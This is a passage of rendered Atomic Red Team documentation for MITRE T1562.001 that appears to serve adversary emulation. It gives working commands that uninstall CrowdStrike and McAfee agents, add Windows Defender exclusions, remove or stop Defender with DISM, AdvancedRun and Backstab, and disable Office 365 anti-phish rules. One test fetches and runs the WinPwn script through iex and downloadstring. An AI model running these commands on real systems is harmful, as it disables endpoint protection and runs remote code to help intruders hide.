<span class="nb">Remove-Service</span> <span class="n">-Name</span> <span class="n">McAfeeDLPAgentService</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">21</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-22-uninstall-crowdstrike-falcon-on-windowsuninstall-crowdstrike-falcon-if-the-windowssensor-exe-path-is-not-provided-as-an-argument-we-need-to-search-for-it-since-the-executable-is-located-in-a-folder-named-with-a-random-guid-we-need-to-identify-it-before-invoking-the-uninstaller">
<h3>Atomic Test #22 - Uninstall Crowdstrike Falcon on WindowsUninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.<a class="headerlink" href="#atomic-test-22-uninstall-crowdstrike-falcon-on-windowsuninstall-crowdstrike-falcon-if-the-windowssensor-exe-path-is-not-provided-as-an-argument-we-need-to-search-for-it-since-the-executable-is-located-in-a-folder-named-with-a-random-guid-we-need-to-identify-it-before-invoking-the-uninstaller" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="s2">&quot;C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe&quot;</span><span class="p">)</span> <span class="p">{.</span> <span class="s2">&quot;C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe&quot;</span> <span class="p">/</span><span class="n">repair</span> <span class="p">/</span><span class="n">uninstall</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="s2">&quot;C:\ProgramData\Package Cache&quot;</span> <span class="n">-Include</span> <span class="s2">&quot;WindowsSensor.exe&quot;</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nv">$sig</span><span class="p">=$(</span><span class="nb">Get-AuthenticodeSignature</span> <span class="n">-FilePath</span> <span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$sig</span><span class="p">.</span><span class="n">Status</span> <span class="o">-eq</span> <span class="s2">&quot;Valid&quot;</span> <span class="o">-and</span> <span class="nv">$sig</span><span class="p">.</span><span class="n">SignerCertificate</span><span class="p">.</span><span class="n">DnsNameList</span> <span class="o">-eq</span> <span class="s2">&quot;CrowdStrike, Inc.&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="p">.</span> <span class="s2">&quot;$_&quot;</span> <span class="p">/</span><span class="n">repair</span> <span class="p">/</span><span class="n">uninstall</span> <span class="p">/</span><span class="n">quiet</span><span class="p">;</span> <span class="k">break</span><span class="p">;}}}```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">22</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-23-tamper-with-windows-defender-evade-scanning-foldermalware-can-exclude-a-specific-path-from-being-scanned-and-evading-detection">
<h3>Atomic Test #23 - Tamper with Windows Defender Evade Scanning -FolderMalware can exclude a specific path from being scanned and evading detection.<a class="headerlink" href="#atomic-test-23-tamper-with-windows-defender-evade-scanning-foldermalware-can-exclude-a-specific-path-from-being-scanned-and-evading-detection" title="Permalink to this heading">#</a></h3>
<p>Upon successul execution, the file provided should be on the list of excluded path.
To check the exclusion list using poweshell (Get-MpPreference).ExclusionPath
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedpath</span><span class="p">=</span> <span class="s2">&quot;C:\Temp&quot;</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="nv">$excludedpath</span><span class="p">```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">23</span>
</pre></div>
</div>
</div>
</div>
<section id="id35">
<h4>Cleanup:<a class="headerlink" href="#id35" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedpath</span><span class="p">=</span> <span class="s2">&quot;C:\Temp&quot;</span>
<span class="nb">Remove-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="nv">$excludedpath</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">23</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-24-tamper-with-windows-defender-evade-scanning-extensionmalware-can-exclude-specific-extensions-from-being-scanned-and-evading-detection">
<h3>Atomic Test #24 - Tamper with Windows Defender Evade Scanning -ExtensionMalware can exclude specific extensions from being scanned and evading detection.<a class="headerlink" href="#atomic-test-24-tamper-with-windows-defender-evade-scanning-extensionmalware-can-exclude-specific-extensions-from-being-scanned-and-evading-detection" title="Permalink to this heading">#</a></h3>
<p>Upon successful execution, the extension(s) should be on the list of excluded extensions.
To check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedExts</span><span class="p">=</span> <span class="s2">&quot;.exe&quot;</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span>  <span class="nv">$excludedExts</span><span class="p">```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">24</span>
</pre></div>
</div>
</div>
</div>
<section id="id36">
<h4>Cleanup:<a class="headerlink" href="#id36" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedExts</span><span class="p">=</span> <span class="s2">&quot;.exe&quot;</span>
<span class="nb">Remove-MpPreference</span> <span class="n">-ExclusionExtension</span>  <span class="nv">$excludedExts</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">24</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-25-tamper-with-windows-defender-evade-scanning-processmalware-can-exclude-specific-processes-from-being-scanned-and-evading-detection">
<h3>Atomic Test #25 - Tamper with Windows Defender Evade Scanning -ProcessMalware can exclude specific processes from being scanned and evading detection.<a class="headerlink" href="#atomic-test-25-tamper-with-windows-defender-evade-scanning-processmalware-can-exclude-specific-processes-from-being-scanned-and-evading-detection" title="Permalink to this heading">#</a></h3>
<p>Upon successful execution, the process(es) should be on the list of excluded processes.
To check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.”
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedProcess</span> <span class="p">=</span> <span class="s2">&quot;outlook.exe&quot;</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="nv">$excludedProcess</span><span class="p">```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">25</span>
</pre></div>
</div>
</div>
</div>
<section id="id37">
<h4>Cleanup:<a class="headerlink" href="#id37" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedProcess</span> <span class="p">=</span> <span class="s2">&quot;outlook.exe&quot;</span>
<span class="nb">Remove-MpPreference</span> <span class="n">-ExclusionProcess</span>  <span class="nv">$excludedProcess</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">25</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-26-office-365-disable-antiphishrule">
<h3>Atomic Test #26 - office-365-Disable-AntiPhishRule<a class="headerlink" href="#atomic-test-26-office-365-disable-antiphishrule" title="Permalink to this heading">#</a></h3>
<p>Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.</p>
<p><strong>Supported Platforms:</strong> office-365</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="id38">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id38" title="Permalink to this heading">#</a></h4>
<section id="description-exchangeonlinemanagement-powershell-module-must-be-installed">
<h5>Description: ExchangeOnlineManagement PowerShell module must be installed<a class="headerlink" href="#description-exchangeonlinemanagement-powershell-module-must-be-installed" title="Permalink to this heading">#</a></h5>
</section>
<section id="id39">
<h5>Check Prereq Commands:<a class="headerlink" href="#id39" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$RequiredModule</span> <span class="p">=</span> <span class="nb">Get-Module</span> <span class="n">-Name</span> <span class="n">ExchangeOnlineManagement</span> <span class="n">-ListAvailable</span>
<span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$RequiredModule</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$RequiredModule</span><span class="p">.</span><span class="n">ExportedCommands</span><span class="p">[</span><span class="s1">&#39;Connect-ExchangeOnline&#39;</span><span class="p">])</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span>
</pre></div>
</div>
</section>
<section id="id40">
<h5>Get Prereq Commands:<a class="headerlink" href="#id40" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Install-Module</span> <span class="n">-Name</span> <span class="n">ExchangeOnlineManagement</span>
<span class="nb">Import-Module</span> <span class="n">ExchangeOnlineManagement</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">26</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="attack-commands-run-with-powershell">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$secure_pwd</span> <span class="p">=</span> <span class="s2">&quot;None&quot;</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;None&quot;</span><span class="p">,</span> <span class="nv">$secure_pwd</span>
<span class="nb">Connect-ExchangeOnline</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
<span class="nv">$test</span> <span class="p">=</span> <span class="nb">Get-AntiPhishRule</span>
<span class="nb">Disable-AntiPhishRule</span> <span class="n">-Identity</span> <span class="nv">$test</span><span class="p">.</span><span class="n">Name</span> <span class="n">-Confirm</span><span class="p">:</span><span class="nv">$false</span>
<span class="nb">Get-AntiPhishRule</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">26</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id41">
<h4>Cleanup:<a class="headerlink" href="#id41" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="s2">&quot;None&quot;</span> <span class="o">-ne</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="nv">$secure_pwd</span> <span class="p">=</span> <span class="p">(</span><span class="s2">&quot;None&quot;</span> <span class="p">+</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;None&quot;</span><span class="p">,</span> <span class="nv">$secure_pwd</span>
<span class="nb">Connect-ExchangeOnline</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
<span class="nv">$test</span> <span class="p">=</span> <span class="nb">Get-AntiPhishRule</span>
<span class="nb">Enable-AntiPhishRule</span> <span class="n">-Identity</span> <span class="nv">$test</span><span class="p">.</span><span class="n">Name</span> <span class="n">-Confirm</span><span class="p">:</span><span class="nv">$false</span>
<span class="nb">Get-AntiPhishRule</span>
<span class="p">}</span> 
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">26</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-27-disable-windows-defender-with-dismthe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-dism-exe-deployment-image-servicing-and-management-tool">
<h3>Atomic Test #27 - Disable Windows Defender with DISMThe following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool.<a class="headerlink" href="#atomic-test-27-disable-windows-defender-with-dismthe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-dism-exe-deployment-image-servicing-and-management-tool" title="Permalink to this heading">#</a></h3>
<p>DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
This method will remove Defender and it’s package.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet```
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">27</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-28-disable-defender-using-nirsoft-advancedrun">
<h3>Atomic Test #28 - Disable Defender Using NirSoft AdvancedRun<a class="headerlink" href="#atomic-test-28-disable-defender-using-nirsoft-advancedrun" title="Permalink to this heading">#</a></h3>
<p>Information on NirSoft AdvancedRun and its creators found here: <a class="reference external" href="http://www.nirsoft.net/utils/advanced_run.html">http://www.nirsoft.net/utils/advanced_run.html</a>
This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
See <a class="reference external" href="https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3">https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3</a>
Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="id42">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id42" title="Permalink to this heading">#</a></h4>
<section id="description-advancedrun-exe-must-exist-at-advancedrun-location">
<h5>Description: Advancedrun.exe must exist at #{AdvancedRun_Location}<a class="headerlink" href="#description-advancedrun-exe-must-exist-at-advancedrun-location" title="Permalink to this heading">#</a></h5>
</section>
<section id="id43">
<h5>Check Prereq Commands:<a class="headerlink" href="#id43" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="nb">Test-Path</span> <span class="n">-Path</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe&quot;</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
</pre></div>
</div>
</section>
<section id="id44">
<h5>Get Prereq Commands:<a class="headerlink" href="#id44" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;http://www.nirsoft.net/utils/advancedrun.zip&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip&quot;</span>
<span class="nb">Expand-Archive</span> <span class="n">-path</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip&quot;</span> <span class="n">-destinationpath</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\&quot;</span> <span class="n">-Force</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">28</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="id45">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id45" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">Try</span> <span class="p">{</span><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe&quot;</span> <span class="p">/</span><span class="n">EXEFilename</span> <span class="s2">&quot;$env:systemroot\System32\sc.exe&quot;</span> <span class="p">/</span><span class="n">WindowState</span> <span class="n">0</span> <span class="p">/</span><span class="n">CommandLine</span> <span class="s2">&quot;stop WinDefend&quot;</span> <span class="p">/</span><span class="n">StartDirectory</span> <span class="s2">&quot;&quot;</span> <span class="p">/</span><span class="n">RunAs</span> <span class="n">8</span> <span class="p">/</span><span class="n">Run</span><span class="p">}</span> <span class="k">Catch</span><span class="p">{}</span>
<span class="k">if</span><span class="p">(</span><span class="n">0</span><span class="p">){</span>
  <span class="nv">$CommandToRun</span> <span class="p">=</span> <span class="nb">rmdir </span><span class="s2">&quot;$env:programdata\Microsoft\Windows Defender&quot;</span> <span class="n">-Recurse</span>
  <span class="k">Try</span> <span class="p">{</span><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe&quot;</span> <span class="p">/</span><span class="n">EXEFilename</span> <span class="s2">&quot;$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe&quot;</span> <span class="p">/</span><span class="n">WindowState</span> <span class="n">0</span> <span class="p">/</span><span class="n">CommandLine</span> <span class="s2">&quot;$CommandToRun&quot;</span> <span class="p">/</span><span class="n">StartDirectory</span> <span class="s2">&quot;&quot;</span> <span class="p">/</span><span class="n">RunAs</span> <span class="n">8</span> <span class="p">/</span><span class="n">Run</span><span class="p">}</span> <span class="k">Catch</span><span class="p">{}</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">28</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id46">
<h4>Cleanup:<a class="headerlink" href="#id46" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">Try</span> <span class="p">{</span><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe&quot;</span> <span class="p">/</span><span class="n">EXEFilename</span> <span class="s2">&quot;$env:systemroot\System32\sc.exe&quot;</span> <span class="p">/</span><span class="n">WindowState</span> <span class="n">0</span> <span class="p">/</span><span class="n">CommandLine</span> <span class="s2">&quot;start WinDefend&quot;</span> <span class="p">/</span><span class="n">StartDirectory</span> <span class="s2">&quot;&quot;</span> <span class="p">/</span><span class="n">RunAs</span> <span class="n">8</span> <span class="p">/</span><span class="n">Run</span><span class="p">}</span> <span class="k">Catch</span><span class="p">{}</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">28</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-29-kill-antimalware-protected-processes-using-backstab">
<h3>Atomic Test #29 - Kill antimalware protected processes using Backstab<a class="headerlink" href="#atomic-test-29-kill-antimalware-protected-processes-using-backstab" title="Permalink to this heading">#</a></h3>
<p>Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
<a class="github reference external" href="https://github.com/Yaxser/Backstab">Yaxser/Backstab</a>
<strong>Supported Platforms:</strong> windows</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="id47">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id47" title="Permalink to this heading">#</a></h4>
<section id="description-backstab64-exe-should-exist-in-extrnalpayloads-directory">
<h5>Description: Backstab64.exe should exist in ExtrnalPayloads Directory<a class="headerlink" href="#description-backstab64-exe-should-exist-in-extrnalpayloads-directory" title="Permalink to this heading">#</a></h5>
</section>
<section id="id48">
<h5>Check Prereq Commands:<a class="headerlink" href="#id48" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe&quot;</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
</pre></div>
</div>
</section>
<section id="id49">
<h5>Get Prereq Commands:<a class="headerlink" href="#id49" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">29</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="id50">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id50" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">&amp;</span> <span class="s2">&quot;PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe&quot;</span> <span class="n">-k</span> <span class="n">-n</span> <span class="n">MsMpEng</span><span class="p">.</span><span class="n">exe</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">29</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-30-winpwn-kill-the-event-log-services-for-stealthkill-the-event-log-services-for-stealth-via-function-of-winpwnsupported-platforms-windows-attack-commands-run-with-powershell">
<h3>Atomic Test #30 - WinPwn - Kill the event log services for stealthKill the event log services for stealth via function of WinPwn<strong>Supported Platforms:</strong> windows#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#atomic-test-30-winpwn-kill-the-event-log-services-for-stealthkill-the-event-log-services-for-stealth-via-function-of-winpwnsupported-platforms-windows-attack-commands-run-with-powershell" title="Permalink to this heading">#</a></h3>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$S3cur3Th1sSh1t_repo</span><span class="p">=</span><span class="s1">&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t&#39;</span>
<span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1&#39;</span><span class="p">)</span>
<span class="n">inv-phantom</span> <span class="n">-consoleoutput</span> <span class="n">-noninteractive</span>  <span class="p">```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">30</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-31-tamper-with-windows-defender-atp-using-aliases-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-using-set-mppreference-aliases-upon-execution-virus-and-threat-protection-will-show-as-disabled">
